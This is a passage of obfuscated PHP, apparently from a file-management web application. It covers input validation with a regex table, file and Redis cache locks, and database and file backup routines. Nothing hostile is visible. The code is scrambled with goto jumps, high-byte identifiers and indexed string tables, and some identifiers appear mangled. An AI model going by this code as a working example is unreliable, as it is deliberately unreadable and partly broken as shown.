$bæ‚‚…˜) { goto f„¶¢÷×Û´; D‘¶’¼× Ì: if (!array_key_exists($eÚîÒœåø, $in)) { if (array_key_exists($EÏÑ²¨Ëïô[1855], $bæ‚‚…˜)) { if (!is_null($bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]])) { $c¯º‰—†ø[$fĞ•èêµ¡] = $bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]]; } } else { if (isset($bæ‚‚…˜[$EÏÑ²¨Ëïô[1856]])) { $dŒ»ª¡Şªö[] = $C»§ÖÕÏ‹ã; } } continue; } if (isset($bæ‚‚…˜[$EÏÑ²¨Ëïô[1856]]) && $bæ‚‚…˜[$EÏÑ²¨Ëïô[1856]] == $EÏÑ²¨Ëïô[278]) { $BÛÄƒ•³Ç = json_decode($in[$eÚîÒœåø], !0); if (is_array($BÛÄƒ•³Ç)) { $c¯º‰—†ø[$fĞ•èêµ¡] = $BÛÄƒ•³Ç; } else { if (array_key_exists($EÏÑ²¨Ëïô[1855], $bæ‚‚…˜)) { if (!is_null($bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]])) { $c¯º‰—†ø[$fĞ•èêµ¡] = $bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]]; } } else { $dŒ»ª¡Şªö[] = $C»§ÖÕÏ‹ã; } } continue; } $cöÔ• ¹ƒ = _get($bæ‚‚…˜, $EÏÑ²¨Ëïô[1013]); goto bàŠ•ÊÆˆ‡; bàŠ•ÊÆˆ‡: if (isset($bæ‚‚…˜[$EÏÑ²¨Ëïô[1856]]) && !self::check($in[$eÚîÒœåø], $bæ‚‚…˜[$EÏÑ²¨Ëïô[1856]], $cöÔ• ¹ƒ)) { if (array_key_exists($EÏÑ²¨Ëïô[1855], $bæ‚‚…˜)) { if (!is_null($bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]])) { $c¯º‰—†ø[$fĞ•èêµ¡] = $bæ‚‚…˜[$EÏÑ²¨Ëïô[1855]]; } } else { $dŒ»ª¡Şªö[] = $C»§ÖÕÏ‹ã; } continue; } $c¯º‰—†ø[$fĞ•èêµ¡] = $in[$eÚîÒœåø]; goto b‰”Í¶Ôí–; f„¶¢÷×Û´: $C»§ÖÕÏ‹ã = _get($bæ‚‚…˜, $EÏÑ²¨Ëïô[1241], $fÓÛÑ»º . $EÏÑ²¨Ëïô[884] . $eÚîÒœåø); $fĞ•èêµ¡ = $eÚîÒœåø; if (isset($bæ‚‚…˜[$EÏÑ²¨Ëïô[1854]]) && $bæ‚‚…˜[$EÏÑ²¨Ëïô[1854]]) { $fĞ•èêµ¡ = $bæ‚‚…˜[$EÏÑ²¨Ëïô[1854]]; } goto D‘¶’¼× Ì; b‰”Í¶Ôí–: } goto Dæ×¨ÍÀ¶; d¥çŠØô¹á: $EÏÑ²¨Ëïô =& $_SERVER[Õİõş]; global $in; $c¯º‰—†ø = array(); goto CÓ›ğÓ·Â; Dæ×¨ÍÀ¶: if (count($dŒ»ª¡Şªö) > 0) { show_json(implode($EÏÑ²¨Ëïô[1857], $dŒ»ª¡Şªö), !1); } return $c¯º‰—†ø; goto FÌì•‘±¨„; FÌì•‘±¨„: } public static function reg($e†Æ˜Š¬åÄ = "\162\145\x71\165\x69\x72\145") { static $dªˆ×á¸¬ = array("\162\145\x71\165\151\x72\x65" => "\56\53", "\x6e\165\155\x62\x65\162" => "\x5c\x64\53", "\150\x65\170" => "\x5b\x30\55\x39\101\55\x46\x61\55\x66\135\53", "\x69\156\x74" => "\x5b\x2d\134\53\x5d\77\x5c\x64\53", "\142\x6f\157\x6c" => "\60\174\x31", "\x66\154\157\141\x74" => "\133\x2d\x5c\53\135\77\134\x64\53\50\x5c\56\134\144\53\x29\x3f", "\x65\156\x67\154\x69\163\x68" => "\x5b\x41\55\132\x61\55\172\x20\x5d\53", "\x63\x68\151\156\x65\x73\145" => "\133\134\x78\x7b\64\145\60\x30\x7d\x2d\x5c\170\173\71\x66\141\x35\175\x5d\53", "\x68\141\x73\103\x68\151\x6e\x65\x73\x65" => "\x2f\50\133\134\x78\x7b\64\145\x30\x30\x7d\55\x5c\170\173\71\x66\141\x35\175\x5d\53\51\57\165", "\145\x6d\141\151\154" => "\x5c\x77\x2b\x28\133\x5c\56\x5c\55\135\x5c\x77\53\51\52\x5c\x40\x5c\x77\x2b\50\133\x5c\56\x5c\55\135\134\167\53\x29\52\134\56\134\x77\x2b", "\x70\x68\x6f\x6e\x65" => "\61\133\x33\x2d\71\x5d\x5c\x64\173\x39\175", "\x74\x65\154\160\150\x6f\x6e\x65" => "\x28\134\50\x5c\x64\x7b\x33\54\x34\x7d\134\51\x7c\x5c\x64\x7b\x33\x2c\64\x7d\55\x7c\134\x73\x29\x3f\x5c\144\x7b\67\54\x31\x34\175", "\165\162\x6c" => "\50\150\164\164\x70\174\146\164\x70\x7c\x68\164\x74\x70\x73\51\x3a\x5c\57\134\57\x5b\x5c\x77\x5c\x2d\x5f\x5d\x2b\50\x5c\56\x5b\x5c\x77\x5c\x2d\137\x5d\x2b\x29\x2b\x28\133\134\x77\134\x2d\134\56\54\x40\77\136\75\x25\x26\72\134\x2f\176\x5c\x2b\x23\135\x2a\133\x5c\x77\x5c\55\134\x40\x3f\136\x3d\45\x26\134\x2f\x7e\x5c\53\43\x5d\x29\x3f", "\165\162\x6c\106\x75\154\x6c" => "\x5b\141\55\172\101\x2d\x7a\x5d\x2b\x3a\x5c\57\134\x2f\x5b\x5e\134\x73\x5d\x2a", "\x69\x70" => "\50\134\x64\173\61\54\x33\x7d\134\x2e\51\x7b\63\175\50\134\x64\173\61\x2c\63\x7d\51", "\172\151\160" => "\133\61\x2d\x39\135\x5c\x64\173\x35\x7d\50\77\x21\134\x64\x29", "\151\144\x43\x61\x72\x64" => "\50\x5c\x64\173\x31\x35\175\51\174\x28\x5c\144\173\61\x37\175\x28\134\144\x7c\x58\174\x78\x29\x29", "\143\x6f\x6c\x6f\x72" => "\x23\x28\x5b\60\55\x39\101\x2d\106\x61\x2d\x66\x5d\x7b\x33\x7d\x7c\133\60\x2d\71\101\55\x46\x61\x2d\x66\x5d\x7b\66\x7d\x29", "\x74\x69\x6d\145" => "\x28\133\x30\55\61\x5d\x5c\144\x7c\x32\x5b\x30\x2d\x34\135\x29\x3a\x5b\x30\55\x35\x5d\x5c\144", "\144\141\x74\145" => "\x5c\144\173\x34\x7d\x5b\x2d\x5c\x2f\x5d\x3f\50\60\133\x31\x2d\x39\135\174\61\x5b\60\55\x32\135\51\x5b\x2d\x5c\x2f\x5d\x3f\50\133\60\x2d\x32\x5d\134\x64\174\63\x5b\x30\x2d\x31\x5d\51", "\x64\141\x74\145\124\151\155\145" => "\134\144\x7b\x34\x7d\x5b\55\x5c\x2f\135\x3f\x28\x30\x5b\61\x2d\71\x5d\x7c\61\x5b\60\55\x32\135\x29\x5b\x2d\x5c\57\135\77\50\x5b\x30\x2d\62\x5d\134\144\174\x33\x5b\x30\55\61\x5d\51\134\163\x2b\x28\133\60\x2d\x31\135\x5c\144\174\x32\x5b\x30\x2d\64\x5d\51\72\x5b\x30\55\65\135\x5c\144", "\x70\141\163\163\167\157\162\144" => "\x28\x3f\75\x2e\x2a\134\144\51\x28\77\x3d\x2e\52\x5b\x61\x2d\172\x5d\x29\50\x3f\x3d\56\52\x5b\101\55\132\135\51\56\x7b\x38\x2c\x32\60\x7d", "\x6b\x65\171" => "\133\x41\x2d\x5a\x61\x2d\172\x30\55\71\137\134\x2d\134\56\135\x2b", "\x6b\x65\171\106\165\x6c\154" => "\x5b\x41\x2d\132\141\x2d\172\60\55\x39\137\134\x2d\134\x2e\134\x73\54\x5d\x2b"); if (!$e†Æ˜Š¬åÄ) { return $dªˆ×á¸¬; } return $dªˆ×á¸¬[$e†Æ˜Š¬åÄ]; } public static function check($e®ÚÌ¯Ÿ, $e®‰•ø‹µ’, $B»²Ò¡Áç„ = null) { $a£ßŸ£ĞâŒ =& $_SERVER[Õİõş]; switch ($e®‰•ø‹µ’) { case $a£ßŸ£ĞâŒ[7]: return in_array($e®ÚÌ¯Ÿ, $B»²Ò¡Áç„); break; case $a£ßŸ£ĞâŒ[1858]: return floatval($e®ÚÌ¯Ÿ) > $B»²Ò¡Áç„; break; case $a£ßŸ£ĞâŒ[1859]: return floatval($e®ÚÌ¯Ÿ) < $B»²Ò¡Áç„; break; case $a£ßŸ£ĞâŒ[321]: return strlen($e®ÚÌ¯Ÿ) >= $B»²Ò¡Áç„[0] && strlen($e®ÚÌ¯Ÿ) <= $B»²Ò¡Áç„[1]; break; case $a£ßŸ£ĞâŒ[321]: if (is_array($B»²Ò¡Áç„)) { return strlen($e®ÚÌ¯Ÿ) >= $B»²Ò¡Áç„[0] && strlen($e®ÚÌ¯Ÿ) <= $B»²Ò¡Áç„[1]; break; } else { return strlen($e®ÚÌ¯Ÿ) == $B»²Ò¡Áç„; break; } case $a£ßŸ£ĞâŒ[317]: return floatval($e®ÚÌ¯Ÿ) >= $B»²Ò¡Áç„[0] && floatval($e®ÚÌ¯Ÿ) <= $B»²Ò¡Áç„[1]; break; } $Dë®¡ç¼Ş = self::reg(!1); $e®‰•ø‹µ’ = isset($Dë®¡ç¼Ş[$e®‰•ø‹µ’]) ? $Dë®¡ç¼Ş[$e®‰•ø‹µ’] : $e®‰•ø‹µ’; if (substr($e®‰•ø‹µ’, 0, 1) != $a£ßŸ£ĞâŒ[8]) { $e®‰•ø‹µ’ = $a£ßŸ£ĞâŒ[1860] . $e®‰•ø‹µ’ . $a£ßŸ£ĞâŒ[1861]; } return preg_match($e®‰•ø‹µ’, $e®ÚÌ¯Ÿ) === 1; } public static function get($eò‘ ³³ˆÜ, $eçÓ„§Ïò² = null, $f·ïŞÂáö = null, $eÏÖƒµ¦ñ = null) { goto bªØ±®ôÙŒ; d†œƒæÚóÛ: return $DĞ—„àéŒñ[$eò‘ ³³ˆÜ]; goto D•óá¿ğŸ–; bªØ±®ôÙŒ: $Eé½Û¶Û– =& $_SERVER[Õİõş]; $FÛãÇéÂÆ = array(); if (!is_null($f·ïŞÂáö)) { $FÛãÇéÂÆ[$Eé½Û¶Û–[34]] = $f·ïŞÂáö; } goto CÎñêÓµ»; CÎñêÓµ»: if (!is_null($eÏÖƒµ¦ñ)) { $FÛãÇéÂÆ[$Eé½Û¶Û–[1013]] = $eÏÖƒµ¦ñ; } if (!is_null($eçÓ„§Ïò²)) { $FÛãÇéÂÆ[$Eé½Û¶Û–[1856]] = $eçÓ„§Ïò²; } $DĞ—„àéŒñ = Input::getArray(array($eò‘ ³³ˆÜ => $FÛãÇéÂÆ)); goto d†œƒæÚóÛ; D•óá¿ğŸ–: } } goto E‹ÔŒé­¹‚; c¼…‘Ç¤À¹: function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $a«ğæ¢ =& $_SERVER[Õİõş]; $AÎÃ§ğ‰àæ = $GLOBALS[$a«ğæ¢[6]][$a«ğæ¢[333]]; self::$cachePath = $AÎÃ§ğ‰àæ[$a«ğæ¢[163]][$a«ğæ¢[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bôÅ‰Ïì»×, $aŠ¡¨÷³ = 0) { goto F‘‰êåïå“; bØÂÅŸ‹ñ‡: $fä’É®‰®É = rtrim(self::$cachePath, $a“¤¬§óŸ[8]) . $a“¤¬§óŸ[782] . md5($bôÅ‰Ïì»×) . $a“¤¬§óŸ[783]; if (file_exists($fä’É®‰®É) && filemtime($fä’É®‰®É) && filemtime($fä’É®‰®É) < time() - 10) { @unlink($fä’É®‰®É); } do { if (file_exists($fä’É®‰®É)) { cacheLockWait(); continue; } $F¸ÔÕØ¶ß² = fopen($fä’É®‰®É, $a“¤¬§óŸ[784]); if (!$F¸ÔÕØ¶ß²) { return !1; } $cãÌó›Šğ = flock($F¸ÔÕØ¶ß², LOCK_EX | LOCK_NB); self::$caches[$bôÅ‰Ïì»×] = array($a“¤¬§óŸ[785] => $F¸ÔÕØ¶ß², $a“¤¬§óŸ[163] => $fä’É®‰®É); fwrite($F¸ÔÕØ¶ß², $cÈâ†ä‡); clearstatcache(); if ($F¸ÔÕØ¶ß² && $cãÌó›Šğ) { return !0; } cacheLockWait(); } while (microtime(!0) < $cÈâ†ä‡); goto d¯ÓÙáíö¡; F‘‰êåïå“: $a“¤¬§óŸ =& $_SERVER[Õİõş]; $b¢ŒÕÓå¦‰ = microtime(!0); $cÈâ†ä‡ = $b¢ŒÕÓå¦‰ + $aŠ¡¨÷³ + 0.0001; goto bØÂÅŸ‹ñ‡; d¯ÓÙáíö¡: $this->unlock($bôÅ‰Ïì»×); return !1; goto c÷•˜Çâôä; c÷•˜Çâôä: } public function lockGet($f°™´šÊ°¿) { $dƒ·ìÓ¦¦ =& $_SERVER[Õİõş]; $Aá¥ãçÛë = rtrim(self::$cachePath, $dƒ·ìÓ¦¦[8]) . $dƒ·ìÓ¦¦[782] . md5($f°™´šÊ°¿) . $dƒ·ìÓ¦¦[783]; return file_exists($Aá¥ãçÛë); } public function unlock($a ÉÍõŒã) { goto d–›‡í÷ÃÅ; d–›‡í÷ÃÅ: $AØº‚¨ÛÉï =& $_SERVER[Õİõş]; $AÑ‡ãŸ¡‡ = self::$caches[$a ÉÍõŒã]; if (!$AÑ‡ãŸ¡‡) { return; } goto a¢à¦øÜ‡; a¢à¦øÜ‡: @flock($AÑ‡ãŸ¡‡[$AØº‚¨ÛÉï[785]], LOCK_UN); @fclose($AÑ‡ãŸ¡‡[$AØº‚¨ÛÉï[785]]); @unlink($AÑ‡ãŸ¡‡[$AØº‚¨ÛÉï[163]]); goto BÌ¨µÕ¿òˆ; BÌ¨µÕ¿òˆ: unset(self::$caches[$a ÉÍõŒã]); goto bØóÈ»Ò›¼; bØóÈ»Ò›¼: } } class CacheLockRedis { public function lock($fã¯œùĞµÚ, $fÀ ñ…¤¿’ = 10) { $DÅæÅÓ„° = Cache::init(); $e©„³×±í° = microtime(!0) + $fÀ ñ…¤¿’; while (microtime(!0) < $e©„³×±í°) { $BœÃæ«±ÎÔ = $DÅæÅÓ„°->get($fã¯œùĞµÚ); if (!$BœÃæ«±ÎÔ) { $dˆãŒ³Œ²â = $DÅæÅÓ„°->setLock($fã¯œùĞµÚ, $e©„³×±í°, $fÀ ñ…¤¿’); if ($dˆãŒ³Œ²â) { return !0; } } else { if ($BœÃæ«±ÎÔ < microtime(!0)) { $DÅæÅÓ„°->set($fã¯œùĞµÚ, $e©„³×±í°, $e©„³×±í°); if ($DÅæÅÓ„°->get($fã¯œùĞµÚ) === $BœÃæ«±ÎÔ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($AÊß×ÊËÍŠ) { return Cache::init()->get($AÊß×ÊËÍŠ); } public function unlock($aØ´·«™¬Â) { return Cache::init()->remove($aØ´·«™¬Â); } } goto a²å˜ºÇˆ; eèÅµ™ÉŒ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a†ğïğç…Á; B†’°É˜°: $A”¼ò¢Œá = new Task($bÕ§Ê”¡–£[713], $bÕ§Ê”¡–£[714], 0, LNG($bÕ§Ê”¡–£[715]) . $bÕ§Ê”¡–£[716] . LNG($bÕ§Ê”¡–£[717])); $c…åóÍë”ß = array_diff($c…åóÍë”ß, array($bÕ§Ê”¡–£[718], $bÕ§Ê”¡–£[719])); foreach ($c…åóÍë”ß as $D‚Ú×Üá£) { $f‹•Ø»ÉÙï = $aô¾ºÛÇŠ‹ . $D‚Ú×Üá£ . $bÕ§Ê”¡–£[720]; $F–±‡ãÖÌ¸ = null; if ($D‚Ú×Üá£ == $bÕ§Ê”¡–£[721] && (!isset($CÈùó¾¶Óí[$bÕ§Ê”¡–£[694]]) || $CÈùó¾¶Óí[$bÕ§Ê”¡–£[694]] == $bÕ§Ê”¡–£[463])) { $F–±‡ãÖÌ¸ = self::$io; } $dŸ–‡ƒÀ += $a„ĞÉÕíÏ->sqlFromDb($D‚Ú×Üá£, $f‹•Ø»ÉÙï, $A”¼ò¢Œá, $F–±‡ãÖÌ¸); } goto d¯æ¯‡½šæ; CìÊÏÙØº¹: return !0; goto eÉ¤Á²‚¾†; a†ğïğç…Á: $bÕ§Ê”¡–£ =& $_SERVER[Õİõş]; $CÈùó¾¶Óí = Backup::get(); self::$io = $CÈùó¾¶Óí[$bÕ§Ê”¡–£[693]]; goto Aï‚Ê­‹; Aï‚Ê­‹: self::$name = $CÈùó¾¶Óí[$bÕ§Ê”¡–£[28]]; $A«˜¹îµ„ = $GLOBALS[$bÕ§Ê”¡–£[6]][$bÕ§Ê”¡–£[17]]; $e¡¥—áµ§õ = $this->_dbType($A«˜¹îµ„); goto d„‚ÔÃÅ Ê; d„İ³Š³: mk_dir($aô¾ºÛÇŠ‹); $c…åóÍë”ß = $a„ĞÉÕíÏ->db()->getTables(); $dŸ–‡ƒÀ = 0; goto B†’°É˜°; d„‚ÔÃÅ Ê: $a„ĞÉÕíÏ = new DbManage($A«˜¹îµ„, $e¡¥—áµ§õ); $aô¾ºÛÇŠ‹ = TEMP_FILES . $bÕ§Ê”¡–£[712] . self::$name . $bÕ§Ê”¡–£[8]; del_dir($aô¾ºÛÇŠ‹); goto d„İ³Š³; d¯æ¯‡½šæ: $A”¼ò¢Œá->end(); $AÃ¹òİ¯í· = array($bÕ§Ê”¡–£[722] => $e¡¥—áµ§õ, $bÕ§Ê”¡–£[709] => 1, $bÕ§Ê”¡–£[723] => $dŸ–‡ƒÀ, $bÕ§Ê”¡–£[724] => $dŸ–‡ƒÀ); Backup::set($AÃ¹òİ¯í·); goto CìÊÏÙØº¹; eÉ¤Á²‚¾†: } private function _dbType($DæöÆÇ™¨) { goto fª‘Œ¯˜êÑ; Fí¢ºóŠÚè: if ($A„çÊöæ†® == $a¡ÊíŞ íÌ[726]) { $bÚ™ÄœéòÚ = explode($a¡ÊíŞ íÌ[4], $DæöÆÇ™¨[$a¡ÊíŞ íÌ[727]]); $A„çÊöæ†® = $bÚ™ÄœéòÚ[0]; } $dá™òìùÆŒ = array($a¡ÊíŞ íÌ[728] => $a¡ÊíŞ íÌ[9], $a¡ÊíŞ íÌ[729] => $a¡ÊíŞ íÌ[730]); if (isset($dá™òìùÆŒ[$A„çÊöæ†®])) { $A„çÊöæ†® = $dá™òìùÆŒ[$A„çÊöæ†®]; } goto FæËŠ¤­¦å; FæËŠ¤­¦å: return $A„çÊöæ†®; goto d”»È†£ËŠ; fª‘Œ¯˜êÑ: $a¡ÊíŞ íÌ =& $_SERVER[Õİõş]; $DæöÆÇ™¨ = array_change_key_case($DæöÆÇ™¨); $A„çÊöæ†® = $DæöÆÇ™¨[$a¡ÊíŞ íÌ[725]]; goto Fí¢ºóŠÚè; d”»È†£ËŠ: } } class BackupDbFile { public function __construct() { } public function index() { goto aÛÍ“Î±£ğ; DˆÅ®ãˆ¨¢: return !0; goto E›ƒí·ƒË‚; EÒÁˆ¶İ—¶: IO::copy($aÊ¦²†„, $Cø˜ò‘÷”´ . "\142\141\x63\153\x75\x70\x5f{$eœ·Åˆ}\x2f"); $C—êÍÜ¹ğ->end(); Backup::set(array($fã‚ùíìÈŒ[735] => $A›’Øîƒ…¢[$fã‚ùíìÈŒ[77]])); goto DˆÅ®ãˆ¨¢; B©Ü³™Èß: $C—êÍÜ¹ğ = new TaskFileTransfer($fã‚ùíìÈŒ[731], $fã‚ùíìÈŒ[714], 0, LNG($fã‚ùíìÈŒ[715]) . $fã‚ùíìÈŒ[407] . LNG($fã‚ùíìÈŒ[717]) . $fã‚ùíìÈŒ[732]); $C—êÍÜ¹ğ->addPath($D»œêï½µô); $A›’Øîƒ…¢ = IO::infoWithChildren($D»œêï½µô); goto Aæä¤˜—Ñ; Aæä¤˜—Ñ: Backup::set(array($fã‚ùíìÈŒ[733] => $A›’Øîƒ…¢[$fã‚ùíìÈŒ[77]])); IO::move($D»œêï½µô, $Cø˜ò‘÷”´); $aÊ¦²†„ = CONTROLLER_DIR . $fã‚ùíìÈŒ[734]; goto EÒÁˆ¶İ—¶; BÀôä™ßİ×: $D»œêï½µô = TEMP_FILES . "\142\x61\143\x6b\165\160\x5f{$eœ·Åˆ}\57"; $Cø˜ò‘÷”´ = "\x7b\x69\157\x3a{$bñ“´¼åô˜[$fã‚ùíìÈŒ[693]]}\x7d\57\x64\x61\164\x61\x62\x61\x73\x65\x2f"; IO::mkdir($Cø˜ò‘÷”´ . "\142\x61\143\x6b\x75\x70\137{$eœ·Åˆ}\57"); goto B©Ü³™Èß; aÛÍ“Î±£ğ: $fã‚ùíìÈŒ =& $_SERVER[Õİõş]; $bñ“´¼åô˜ = Backup::get(); $eœ·Åˆ = $bñ“´¼åô˜[$fã‚ùíìÈŒ[28]]; goto BÀôä™ßİ×; E›ƒí·ƒË‚: } } class BackupFile { public function __construct() { } public function index() { goto dô³•ìÍ†; dô³•ìÍ†: $E™”Õ“İÇ¸ = Backup::get(); $aÙÏ—ä° = $E™”Õ“İÇ¸[$_SERVER[Õİõş][277]][$_SERVER[Õİõş][163]][$_SERVER[Õİõş][414]]; $DìŸâ˜ÜÎÒ = array($_SERVER[Õİõş][415] => array($_SERVER[Õİõş][736], $aÙÏ—ä°), $_SERVER[Õİõş][737] => array($_SERVER[Õİõş][315], $E™”Õ“İÇ¸[$_SERVER[Õİõş][693]])); goto a¼Ş‰³˜¼; E¨«–‘¾Ç: $CËçß²÷ ë = $fÉÅ÷Æ‰Ñ = 0; do { $BŠÀ²Ï†Íô = $_SERVER[Õİõş][742]; $d•õĞ§©© = Model($_SERVER[Õİõş][721])->where($DìŸâ˜ÜÎÒ)->field($BŠÀ²Ï†Íô)->order($_SERVER[Õİõş][743])->selectPage($EÓóŒÕÁÆ¢, $bØÔª¸ğ–ø); $AÃù‡éŸ×Œ = !empty($d•õĞ§©©[$_SERVER[Õİõş][350]]) ? $d•õĞ§©©[$_SERVER[Õİõş][350]] : array(); foreach ($AÃù‡éŸ×Œ as $EÌÊÁ°ï¨Ş) { goto bŠİ‘Ö†»˜; fªØÙ¾ÜÜ‹: if (IO::exist($fë™‚‰Ô”†)) { $f¬êŸ½ŠÁÒ->updateFileEnd($EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][28]], $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][77]]); } else { $fë™‚‰Ô”† = get_path_father($fë™‚‰Ô”†); IO::mkdir($fë™‚‰Ô”†); if (!IO::copy($fÁ­‰¤ç†ç, $fë™‚‰Ô”†, $_SERVER[Õİõş][746])) { write_log($_SERVER[Õİõş][747] . $fÁ­‰¤ç†ç . $_SERVER[Õİõş][748] . $fë™‚‰Ô”† . $_SERVER[Õİõş][471], $_SERVER[Õİõş][714]); $f„ÂÕ¥óÇ¡ = !1; break; } } $aÙÏ—ä° = $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][414]]; $eÜ¤Éç¼åé += 1; goto AÉÇ‚ò‘à„; bŠİ‘Ö†»˜: if (!$this->_fileExist($EÌÊÁ°ï¨Ş, $CóÆ ­åŠõ, $a«Êù‚­¥å)) { $a…³µĞÚäµ -= 1; $b°™Ï…’ò -= (int) $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][77]]; write_log("\146\x69\x6c\x65\40\156\x6f\x74\x20\x65\170\151\x73\x74\56\146\x69\154\145\x49\104\72{$EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][414]]}\54\x20\x70\141\164\150\72{$EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][75]]}", $_SERVER[Õİõş][744]); continue; } $fÁ­‰¤ç†ç = $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][75]]; $fë™‚‰Ô”† = "\x7b\151\157\x3a{$E™”Õ“İÇ¸[$_SERVER[Õİõş][693]]}\x7d" . substr($fÁ­‰¤ç†ç, strlen("\x7b\151\157\x3a{$EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][745]]}\x7d")); goto fªØÙ¾ÜÜ‹; AÉÇ‚ò‘à„: $dÆ†å‹¹áç += $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][77]]; $fÉÅ÷Æ‰Ñ += 1; $CËçß²÷ ë += $EÌÊÁ°ï¨Ş[$_SERVER[Õİõş][77]]; goto c¹—´æ‘å; c¹—´æ‘å: if ($dÆ†å‹¹áç >= 1024 * 1024 * 100) { $A¬‚£¼ù¤Ô = array($_SERVER[Õİõş][749] => $aÙÏ—ä°, $_SERVER[Õİõş][750] => $fÉÅ÷Æ‰Ñ, $_SERVER[Õİõş][751] => $CËçß²÷ ë); Backup::set($A¬‚£¼ù¤Ô); $dÆ†å‹¹áç = $eÜ¤Éç¼åé = 0; } goto A®‚Á¬‘”; A®‚Á¬‘”: } $e‚³“ƒ„™± = count($AÃù‡éŸ×Œ); $bØÔª¸ğ–ø++; } while ($e‚³“ƒ„™± == $EÓóŒÕÁÆ¢); $f¬êŸ½ŠÁÒ->end(); goto càÜÁèë‰’; a¼Ş‰³˜¼: $a…³µĞÚäµ = (int) Model($_SERVER[Õİõş][721])->where($DìŸâ˜ÜÎÒ)->count($_SERVER[Õİõş][414]); $b°™Ï…’ò = (int) Model($_SERVER[Õİõş][721])->where($DìŸâ˜ÜÎÒ)->sum($_SERVER[Õİõş][77]); $f¬êŸ½ŠÁÒ = new TaskFileTransfer($_SERVER[Õİõş][738], $_SERVER[Õİõş][714], $a…³µĞÚäµ, LNG($_SERVER[Õİõş][715]) . $_SERVER[Õİõş][716] . LNG($_SERVER[Õİõş][739])); goto fÀôõÅÈª˜; fÀôõÅÈª˜: $f¬êŸ½ŠÁÒ->task[$_SERVER[Õİõş][700]] = $b°™Ï…’ò; $A¬‚£¼ù¤Ô = array($_SERVER[Õİõş][740] => $a…³µĞÚäµ, $_SERVER[Õİõş][741] => $b°™Ï…’ò); Backup::set($A¬‚£¼ù¤Ô); goto dã¡–Ş¨; CãËÆŸ¶øˆ: Backup::set($A¬‚£¼ù¤Ô); $this->_fileFilter($CóÆ ­åŠõ); return !0; goto dë™ãÇª¿; dã¡–Ş¨: $f„ÂÕ¥óÇ¡ = !0; $a«Êù‚­¥å = $this->storeIds(); $bØÔª¸ğ–ø = 1; goto e°îó¨×ŸÇ; e°îó¨×ŸÇ: $EÓóŒÕÁÆ¢ = 1000; $dÆ†å‹¹áç = $eÜ¤Éç¼åé = 0; $CóÆ ­åŠõ = array(); goto E¨«–‘¾Ç; càÜÁèë‰’: $Eª¸ÙîñëÔ = $f„ÂÕ¥óÇ¡ ? 1 : 0; $A¬‚£¼ù¤Ô = array($_SERVER[Õİõş][752] => 1, $_SERVER[Õİõş][705] => time(), $_SERVER[Õİõş][711] => $Eª¸ÙîñëÔ, $_SERVER[Õİõş][749] => $aÙÏ—ä°, $_SERVER[Õİõş][741] => $b°™Ï…’ò, $_SERVER[Õİõş][740] => $a…³µĞÚäµ); if ($eÜ¤Éç¼åé) { $A¬‚£¼ù¤Ô[$_SERVER[Õİõş][750]] = $fÉÅ÷Æ‰Ñ; $A¬‚£¼ù¤Ô[$_SERVER[Õİõş][751]] = $CËçß²÷ ë; } goto CãËÆŸ¶øˆ; dë™ãÇª¿: } private function _fileExist($cÀ‡äÚ‚ƒ, &$eáÊ²Á•, $E²íğË¥§­) { goto F¥Ñ¹á³¹ƒ; cœ§œ°¸ˆï: $eáÊ²Á• = array_merge($eáÊ²Á•, array_to_keyvalue($B¦‘Âº‹ªó, $e§øÂ´Ş®Ã[33], $e§øÂ´Ş®Ã[414])); return !1; goto BŸµ¹ĞƒÔÇ; F¥Ñ¹á³¹ƒ: $e§øÂ´Ş®Ã =& $_SERVER[Õİõş]; $eŞİ”±Ò = $cÀ‡äÚ‚ƒ[$e§øÂ´Ş®Ã[75]]; if (in_array($cÀ‡äÚ‚ƒ[$e§øÂ´Ş®Ã[414]], $eáÊ²Á•)) { return !1; } goto b•Éø­ù; b•Éø­ù: if (!in_array($cÀ‡äÚ‚ƒ[$e§øÂ´Ş®Ã[745]], $E²íğË¥§­)) { return !1; } if (IO::exist($eŞİ”±Ò)) { return !0; } $Cçï…É¯¡Î = get_path_father($eŞİ”±Ò); goto b©ôŞæ”¢; b©ôŞæ”¢: if (IO::exist($Cçï…É¯¡Î)) { $eáÊ²Á•[] = $cÀ‡äÚ‚ƒ[$e§øÂ´Ş®Ã[414]]; return !1; } $fÌª‡¶“ì˜ = array($e§øÂ´Ş®Ã[745] => $cÀ‡äÚ‚ƒ[$e§øÂ´Ş®Ã[745]], $e§øÂ´Ş®Ã[75] => array($e§øÂ´Ş®Ã[753], "{$Cçï…É¯¡Î}\45")); $B¦‘Âº‹ªó = Model($e§øÂ´Ş®Ã[721])->where($fÌª‡¶“ì˜)->field($e§øÂ´Ş®Ã[415])->select(); goto cœ§œ°¸ˆï; BŸµ¹ĞƒÔÇ: } private function _fileFilter($dïÅËÂ¹Â‰) { $dÔ¤ÉÙãé‹ =& $_SERVER[Õİõş]; if (empty($dïÅËÂ¹Â‰)) { return; } $C—ªÁ’±æ = array($dÔ¤ÉÙãé‹[414] => array($dÔ¤ÉÙãé‹[7], array_unique($dïÅËÂ¹Â‰))); $Dñ™ëöØ¿Ú = Model($dÔ¤ÉÙãé‹[754])->where($C—ªÁ’±æ)->field($dÔ¤ÉÙãé‹[365])->select(); foreach ($Dñ™ëöØ¿Ú as $cº‚Á‚¸Ó„) { Model($dÔ¤ÉÙãé‹[754])->remove($cº‚Á‚¸Ó„[$dÔ¤ÉÙãé‹[365]], !1); } } private function storeIds() { $Fêê…ãÁï =& $_SERVER[Õİõş]; $bá¿È–â¯ = Model($Fêê…ãÁï[706])->listData(); return array_to_keyvalue($bá¿È–â¯, $Fêê…ãÁï[33], $Fêê…ãÁï[363]); } } goto E„ãÙí¤Ä; 